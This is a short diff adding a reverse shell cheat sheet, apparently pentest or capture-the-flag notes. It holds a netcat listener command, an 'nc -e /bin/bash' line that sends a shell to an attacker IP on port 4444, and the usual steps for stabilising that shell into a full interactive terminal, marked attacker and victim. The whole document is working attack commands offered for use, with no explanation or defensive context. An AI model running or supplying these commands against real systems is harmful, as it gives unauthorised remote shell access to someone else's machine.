@@ -1,0 +1,15 @@
+nc -nlvp 4444
+nc -e /bin/bash 192.168.122.209 4444
+python3 -V
+python -c 'import pty; pty.spawn("/bin/bash")' 
+Ctrl + Z (background the shell)
+stty raw -echo; fg
+reset
+echo $TERM
+export TERM=xterm-256color
+echo $TERM
+echo $SHELL
+export SHELL=/bin/bash
+echo $SHELL
+(ATTACKER) echo $TERM && tput lines && tput cols
+(VICTIM) stty rows 38 columns 116 
